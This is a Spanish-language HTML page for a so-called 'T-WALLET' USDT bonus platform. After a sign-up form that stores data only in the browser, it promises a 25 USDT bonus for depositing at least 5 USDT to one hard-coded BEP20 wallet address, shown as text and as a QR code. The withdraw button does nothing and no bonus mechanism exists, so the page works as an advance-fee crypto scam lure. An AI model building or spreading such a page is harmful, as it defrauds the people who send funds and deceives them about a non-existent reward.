<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>T-WALLET - Plataforma de Bonos USDT</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8f0;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #login-screen, #main-screen {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            border-radius: 10px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        h2 {
            text-align: center;
            color: #32CD32;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            background-color: #32CD32;
            color: white;
            border-radius: 5px;
            font-size: 16px;
        }

        button:hover {
            background-color: #28a745;
            cursor: pointer;
        }

        #qr-panel {
            text-align: center;
        }

        #qr-code {
            background-color: #f1f1f1;
            width: 200px;
            height: 200px;
            margin: 0 auto;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- Pantalla de Registro/Inicio de Sesión -->
        <div id="login-screen">
            <h2>Bienvenido a T-WALLET</h2>
            <form id="login-form">
                <input type="text" id="name" placeholder="Nombre" required>
                <input type="text" id="last-name" placeholder="Apellidos" required>
                <input type="email" id="email" placeholder="Correo Electrónico" required>
                <input type="password" id="password" placeholder="Contraseña" required>
                <input type="password" id="confirm-password" placeholder="Confirmar Contraseña" required>
                <button type="submit">Registrar / Iniciar Sesión</button>
            </form>
        </div>

        <!-- Pantalla Principal después de iniciar sesión -->
        <div id="main-screen" style="display: none;">
            <h2>¡Felicidades! Te has registrado correctamente.</h2>
            <p>Deposita 5 USDT o más para recibir tu bono de 25 USDT.</p>
            <p>Dirección de USDT BEP20: <span id="crypto-address">0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e</span></p>
            <button id="copy-address">Copiar Dirección</button>
            <button id="withdraw">Retirar</button>
            <button id="add-funds">Agregar Fondos</button>

            <!-- Panel QR -->
            <div id="qr-panel" style="display: none;">
                <h3>Escanea el código QR para depositar</h3>
                <div id="qr-code"></div>
                <p>¡Recuerda usar solo la red BEP20!</p>
            </div>
        </div>
    </div>

    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    <script>
        // Simula almacenamiento en localStorage
        if (localStorage.getItem('user')) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-screen').style.display = 'block';
        }

        // Registra o inicia sesión el usuario
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const name = document.getElementById('name').value;
            const lastName = document.getElementById('last-name').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirm-password').value;

            if (password === confirmPassword) {
                const user = { name, lastName, email };
                localStorage.setItem('user', JSON.stringify(user));
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-screen').style.display = 'block';
            } else {
                alert('Las contraseñas no coinciden.');
            }
        });

        // Copiar dirección de criptomoneda
        document.getElementById('copy-address').addEventListener('click', function() {
            const cryptoAddress = document.getElementById('crypto-address').textContent;
            navigator.clipboard.writeText(cryptoAddress).then(() => {
                alert('Dirección copiada al portapapeles.');
            });
        });

        // Agregar fondos y mostrar código QR
        document.getElementById('add-funds').addEventListener('click', function() {
            document.getElementById('qr-panel').style.display = 'block';

            // Generar código QR para la dirección de USDT
            new QRCode(document.getElementById("qr-code"), {
                text: "0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e", // Dirección de USDT
                width: 200,
                height: 200
            });
        });
    </script>
</body>
  </html>
